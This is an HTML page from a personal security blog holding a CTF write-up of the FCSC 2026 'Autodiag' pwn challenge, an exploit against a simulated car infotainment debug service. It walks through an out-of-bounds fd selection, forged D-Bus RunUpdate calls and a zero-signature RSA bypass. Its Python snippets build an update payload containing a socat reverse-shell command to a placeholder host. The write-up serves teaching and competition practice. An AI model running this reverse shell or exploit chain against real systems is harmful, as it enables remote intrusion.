@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>0xb0tm4n&#x27;s website</title>
+  <script src="/js/index.js" defer></script>
+  <script src="/js/prompt.js" defer></script>
+  <script src="/js/keyboard.js" defer></script>
+  <script src="/js/tab.js" defer></script>
+  <script src="/js/commands.js" defer></script>
+  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head>
+
+<body onkeydown="exec(event)">
+    <main>
+      <div class="files" id="files" tabindex="0">
+<ul><li class="file">
+    <span>├── <a href="https://super-botman.github.io/readme/" tabindex="-2">README</a></span>
+    </li><li class="folder">
+    <span>├── <a href="https://super-botman.github.io/web/" tabindex="-3">Web</a></span>
+    <ul><li class="folder">
+    <span>│   └── <a href="https://super-botman.github.io/web/writeups/" tabindex="-4">Writeups</a></span>
+    <ul><li class="file">
+    <span>│       ├── <a href="https://super-botman.github.io/web/writeups/thomghost/" tabindex="-5">THM | Thomghost</a></span>
+    </li><li class="file">
+    <span>│       └── <a href="https://super-botman.github.io/web/writeups/boiler/" tabindex="-6">THM | Boiler</a></span>
+    </li>
+      </ul>
+    </li>
+      </ul>
+    </li><li class="folder">
+    <span>└── <a href="https://super-botman.github.io/pwn/" tabindex="-7">Pwn</a></span>
+    <ul><li class="folder">
+    <span>    └── <a href="https://super-botman.github.io/pwn/writeups/" tabindex="-8">Writeups</a></span>
+    <ul><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/pwn103/" tabindex="-9">THM | pwn101 task 103</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/aarchibald/" tabindex="-10">Hackropole | Aarchibald</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/wsd/" tabindex="-11">FCSC 2026 | wsd</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/bigorneau/" tabindex="-12">FCSC 2025 | Bigorneau</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/alfred/" tabindex="-13">Hackropole | Alfred</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/robot/" tabindex="-14">FCSC 2023 | Robot</a></span>
+    </li><li class="file">
+    <span>        ├── <a class="selected" href="https://super-botman.github.io/pwn/writeups/autodiag/" tabindex="-15">FCSC 2026 | Autodiag</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/armigo/" tabindex="-16">Hackropole | Armigo</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/small-prime-shellcode/" tabindex="-17">FCSC 2025 | Small Prime Shellcode</a></span>
+    </li><li class="file">
+    <span>        └── <a href="https://super-botman.github.io/pwn/writeups/http3/" tabindex="-18">FCSC 2025 | HTTP3</a></span>
+    </li>
+      </ul>
+    </li>
+      </ul>
+    </li>
+</ul>
+</div>
+      <div class="viewer page" id="viewer" tabindex="0">
+        <div class="tab">
+<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
+<ul id="tabs">
+</ul>
+
+
+</div>
+        <div class="content" id="content"><h1 id="pwn-autodiag-fcsc-2026">[Pwn] Autodiag | FCSC 2026</h1>
+<ul>
+<li>Level: ⭐⭐</li>
+<li>Solves: 13</li>
+<li>Description:
+<blockquote>
+<p>Il a l'air intéressant ce port de debug.
+Note : la VM de l'épreuve a accès à Internet.</p>
+</blockquote>
+</li>
+<li>Exploit: <a rel="external" href="https://transfer.0xb0tm4n.org/inline/AbGrScp6Qu/exploit.py">exploit.py</a></li>
+</ul>
+<hr />
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/autodiag/#TLDR">1. TL;DR</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/autodiag/#full-explanation">2. Full explanation</a>
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/autodiag/#protocol">2.1 The protocol</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/autodiag/#the-bug">2.2 The bug</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/autodiag/#dbus">2.3 DBUS</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/autodiag/#runupdate">2.4 RunUpdate</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="tldr">TLDR</h2>
+<ul>
+<li>use OOB for fd selection in resp function to point to dbus fd</li>
+<li>send dbus packets to call <code>RunUpdate</code> method on service <code>com.acme.ivi.ServiceManager</code></li>
+<li>forge a working payload to execute a revshell</li>
+</ul>
+<h2 id="full-explanation">Full explanation</h2>
+<h3 id="protocol">Protocol</h3>
+<p>The protocol was fairly simple, the first 20 bytes were the header and it consisted of a magic header <code>0IVI</code> followed by the version of the protocol (1) and then the op, size and id encoded as 32 bits integer.</p>
+<p>After the header we just had to send our actual payload. So I used flat from pwntools to generate the frames like this:</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span>data</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> flat</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">{</span></span>
+<span class="giallo-l"><span style="color: #FF9E64;">    0</span><span style="color: #89DDFF;">:</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">30495649</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #FF9E64;">    4</span><span style="color: #89DDFF;">:</span><span style="color: #FF9E64;"> 1</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #FF9E64;">    8</span><span style="color: #89DDFF;">:</span><span style="color: #C0CAF5;"> op</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #FF9E64;">    12</span><span style="color: #89DDFF;">:</span><span style="color: #C0CAF5;"> size</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #FF9E64;">    16</span><span style="color: #89DDFF;">:</span><span style="color: #0DB9D7;"> id</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">},</span><span style="color: #E0AF68;"> word_size</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">32</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>data</span><span style="color: #89DDFF;"> +=</span><span> body</span></span></code></pre><h3 id="the-bug">The bug</h3>
+<p>So after a quick look at every possibles operations in <code>ivi_server.c</code> (and they were a lot of them) we could see this in the <code>resp()</code> function that corresponded to <code>OP_RESP</code></p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span>target_fd </span><span style="color: #89DDFF;">=</span><span> st</span><span style="color: #89DDFF;">-</span><span style="color: #BB9AF7;">&gt;</span><span style="color: #C0CAF5;">conn_fds</span><span style="color: #9ABDF5;">[</span><span>idx</span><span style="color: #9ABDF5;">]</span><span style="color: #89DDFF;">;</span></span></code></pre>
+<p>and that was really interesting as the idx value wasn't checked before so we could use it to OOB and connect to arbitrary fd.</p>
+<p>Luckily, this was really interesting in our case as the server was using a dbus connection to interact with the actual car, and the fd that was used to send dbus packet was 3, using this precious information I used gdb to search for this value '\x03\x00\x00\x00' relative to the <code>st-&gt;conn_fds</code> array, I found quite a lot of them and ended up trying 15 different offsets.</p>
+<h3 id="dbus">DBUS</h3>
+<p>So now we could directly communicate to the <code>com.acme.ivi.ServiceManager</code> service, the code for this service was defined into <code>ivi_dbusd.cpp</code> and two method directly caught my eyes, <code>RunUpdate</code> and <code>RunSelfTest</code>, the two were invoking other binary using execv and seemed to be usable to gain RCE, although <code>RunSelfTest</code> was a little weird I ended up finding no bugs in it and going into the <code>RunUpdate</code> way. This one was passing the body of the method call to a binary called <code>ivi_update_runner</code>.</p>
+<p>To communicate through the socket we could forge the packets using <code>dbus-next</code> lib:</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span>payload</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> Message</span><span style="color: #9ABDF5;">(</span></span>
+<span class="giallo-l"><span style="color: #E0AF68;">    message_type</span><span style="color: #89DDFF;">=</span><span style="color: #C0CAF5;">MessageType</span><span style="color: #89DDFF;">.</span><span style="color: #FF9E64;">METHOD_CALL</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #E0AF68;">    destination</span><span style="color: #89DDFF;">=&#39;</span><span style="color: #9ECE6A;">com.acme.ivi.ServiceManager</span><span style="color: #89DDFF;">&#39;,</span></span>
+<span class="giallo-l"><span style="color: #E0AF68;">    path</span><span style="color: #89DDFF;">=&#39;</span><span style="color: #9ECE6A;">/com/acme/ivi/ServiceManager</span><span style="color: #89DDFF;">&#39;,</span></span>
+<span class="giallo-l"><span style="color: #E0AF68;">    interface</span><span style="color: #89DDFF;">=&#39;</span><span style="color: #9ECE6A;">com.acme.ivi.ServiceManager</span><span style="color: #89DDFF;">&#39;,</span></span>
+<span class="giallo-l"><span style="color: #E0AF68;">    member</span><span style="color: #89DDFF;">=&#39;</span><span style="color: #9ECE6A;">RunUpdate</span><span style="color: #89DDFF;">&#39;,</span></span>
+<span class="giallo-l"><span style="color: #E0AF68;">    signature</span><span style="color: #89DDFF;">=&#39;</span><span style="color: #9ECE6A;">s</span><span style="color: #89DDFF;">&#39;,</span></span>
+<span class="giallo-l"><span style="color: #E0AF68;">    body</span><span style="color: #89DDFF;">=[</span><span style="color: #C0CAF5;">body</span><span style="color: #89DDFF;">],</span></span>
+<span class="giallo-l"><span style="color: #E0AF68;">    serial</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">216</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>payload</span><span style="color: #89DDFF;"> =</span><span> payload</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">_marshall</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">negotiate_unix_fd</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">False</span><span style="color: #9ABDF5;">)</span></span></code></pre>
+<p>The only tricky part here was to figure out that the serial number was needed to have a valid communication.</p>
+<h3 id="runupdate">RunUpdate</h3>
+<p>So lastly we had to look at <code>ivi_update_runner.cpp</code>, inside the code was defined a file update format:</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #9ABDF5;">[</span><span style="color: #F7768E;">0x</span><span style="color: #FF9E64;">0</span><span style="color: #9ABDF5;">]</span><span> UPD0: magic</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">[</span><span style="color: #F7768E;">0x</span><span style="color: #FF9E64;">4</span><span style="color: #9ABDF5;">]</span><span> h_size: </span><span style="color: #FF9E64;">32</span><span> bits len of the signature</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">[</span><span style="color: #F7768E;">0x</span><span style="color: #FF9E64;">8</span><span style="color: #9ABDF5;">]</span><span> header: data</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">[</span><span>h_size</span><span style="color: #9ABDF5;">]</span><span> signature: SHA256 of the header value encrypted using RSA</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">[</span><span>h_size</span><span style="color: #89DDFF;">+</span><span style="color: #F7768E;">0x</span><span style="color: #FF9E64;">100</span><span style="color: #9ABDF5;">]</span><span> key: AES key encrypted using RSA</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">[</span><span>h_size</span><span style="color: #89DDFF;">+</span><span style="color: #F7768E;">0x</span><span style="color: #FF9E64;">200</span><span style="color: #9ABDF5;">]</span><span> payload: AES encrypted zlib archive of the update payload</span></span></code></pre>
+<p>Another interesting bit was the RSA decryption function:</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="cpp"><span class="giallo-l"><span style="color: #9D7CD8;font-style: italic;">static</span><span style="color: #C0CAF5;"> std</span><span style="color: #89DDFF;">::</span><span style="color: #C0CAF5;">vector</span><span style="color: #9ABDF5;">&lt;</span><span style="color: #BB9AF7;">uint8_t</span><span style="color: #9ABDF5;">&gt;</span><span style="color: #7AA2F7;"> rsa_public_raw_256</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">RSA</span><span style="color: #9D7CD8;font-style: italic;"> *</span><span style="color: #E0AF68;">rsa</span><span style="color: #89DDFF;">,</span><span style="color: #9D7CD8;font-style: italic;"> const</span><span style="color: #BB9AF7;"> uint8_t</span><span style="color: #9D7CD8;font-style: italic;"> *</span><span style="color: #E0AF68;">sig256</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"><span style="color: #9D7CD8;font-style: italic;">    const</span><span> BIGNUM </span><span style="color: #89DDFF;">*</span><span>n </span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;"> nullptr</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9D7CD8;font-style: italic;">    const</span><span> BIGNUM </span><span style="color: #89DDFF;">*</span><span>e </span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;"> nullptr</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    RSA_get0_key</span><span style="color: #9ABDF5;">(</span><span>rsa</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> &amp;</span><span>n</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> &amp;</span><span>e</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> nullptr</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    BIGNUM </span><span style="color: #89DDFF;">*</span><span>S </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> BN_bin2bn</span><span style="color: #9ABDF5;">(</span><span>sig256</span><span style="color: #89DDFF;">,</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">int</span><span style="color: #9ABDF5;">)</span><span>RSA_BYTES</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> nullptr</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89DDFF;">    [</span><span>...</span><span style="color: #89DDFF;">]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    if </span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">BN_mod_exp</span><span>(</span><span style="color: #C0CAF5;">M</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> S</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> e</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> n</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> ctx</span><span style="color: #9ABDF5;">)</span><span> != 1) </span><span style="color: #9ABDF5;">{</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        BN_free</span><span style="color: #9ABDF5;">(</span><span>M</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        BN_free</span><span style="color: #9ABDF5;">(</span><span>S</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        BN_CTX_free</span><span style="color: #9ABDF5;">(</span><span>ctx</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        throw</span><span style="color: #C0CAF5;"> std</span><span style="color: #89DDFF;">::</span><span style="color: #7AA2F7;">runtime_error</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">BN_mod_exp failed</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    }</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    int</span><span> mlen </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> BN_num_bytes</span><span style="color: #9ABDF5;">(</span><span>M</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    std</span><span style="color: #89DDFF;">::</span><span>vector</span><span style="color: #BB9AF7;">&lt;uint8_t&gt;</span><span style="color: #7AA2F7;"> tmp</span><span style="color: #9ABDF5;">((</span><span style="color: #BB9AF7;">size_t</span><span style="color: #9ABDF5;">)</span><span>mlen</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    BN_bn2bin</span><span style="color: #9ABDF5;">(</span><span>M</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> tmp</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">data</span><span style="color: #9ABDF5;">())</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    if</span><span style="color: #9ABDF5;"> ((</span><span style="color: #BB9AF7;">size_t</span><span style="color: #9ABDF5;">)</span><span>mlen </span><span style="color: #BB9AF7;">&gt;</span><span> RSA_BYTES</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        BN_free</span><span style="color: #9ABDF5;">(M)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        BN_free</span><span style="color: #9ABDF5;">(S)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        BN_CTX_free</span><span style="color: #9ABDF5;">(ctx)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        throw</span><span style="color: #C0CAF5;"> std</span><span style="color: #89DDFF;">::</span><span style="color: #7AA2F7;">runtime_error</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">rsa output too large</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    }</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    memset</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">out</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">data</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">,</span><span> RSA_BYTES</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    memcpy</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">out</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">data</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;"> +</span><span style="color: #9ABDF5;"> (</span><span>RSA_BYTES </span><span style="color: #89DDFF;">-</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">size_t</span><span style="color: #9ABDF5;">)</span><span>mlen</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> tmp</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">data</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">,</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">size_t</span><span style="color: #9ABDF5;">)</span><span>mlen</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    BN_free</span><span style="color: #9ABDF5;">(</span><span>M</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    BN_free</span><span style="color: #9ABDF5;">(</span><span>S</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    BN_CTX_free</span><span style="color: #9ABDF5;">(</span><span>ctx</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;font-style: italic;">    return</span><span> out</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span></code></pre>
+<p>As we can see the last operation on the <code>M</code> value before returning is <code>BN_mod_exp(M, S, e, n, ctx)</code> that just does a <code>M = S^e % n</code> so if we set the S value to 0 then the AES key would be full null bytes so we didn't have to know anything about the private key.</p>
+<p>Using all of this knowledge we could then use the provided <code>update.bin</code> headers to have a valid header+signature combo and then set the AES key to <code>'\x00'*0x100</code> and last but not least our payload compressed and encrypted using the null byte's AES key + null byte's IV.</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span>revshell</span><span style="color: #89DDFF;">=</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">#!/bin/sh</span><span style="color: #89DDFF;">\n</span><span style="color: #9ECE6A;">socat TCP:HOST:PORT EXEC:&#39;/bin/bash -p&#39;</span><span style="color: #89DDFF;">&quot;</span></span>
+<span class="giallo-l"><span>header</span><span style="color: #89DDFF;"> =</span><span style="color: #0DB9D7;"> open</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">./update.bin</span><span style="color: #89DDFF;">&#39;, &#39;</span><span style="color: #9ECE6A;">rb</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">read</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">100</span><span style="color: #89DDFF;">+</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">100</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>cipher</span><span style="color: #89DDFF;"> =</span><span style="color: #FF9E64;"> AES</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">new</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;\x00&#39;*</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">20</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> AES</span><span style="color: #89DDFF;">.</span><span style="color: #FF9E64;">MODE_CBC</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> iv</span><span style="color: #89DDFF;">=</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;\x00&#39;*</span><span style="color: #FF9E64;">16</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>ct</span><span style="color: #89DDFF;"> =</span><span> cipher</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">encrypt</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">pad</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">compress</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">revshell</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> wbits</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">16</span><span style="color: #89DDFF;">+</span><span style="color: #FF9E64;">MAX_WBITS</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 16</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> style</span><span style="color: #89DDFF;">=&#39;</span><span style="color: #9ECE6A;">pkcs7</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">))</span></span>
+<span class="giallo-l"><span>update</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> flat</span><span style="color: #9ABDF5;">(</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    header</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    b</span><span style="color: #89DDFF;">&#39;\x00&#39;*</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">100</span><span style="color: #89DDFF;">,</span><span style="color: #51597D;font-style: italic;"> # aes key</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    ct</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">)</span></span></code></pre>
+<p>So we just had to encode this in base64 and send it through the dbus using previous vuln the shell popped directly into the listener !</p>
+
+        </div>
+      </div>
+      <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+    </main>
+  </body>
+
+</html>
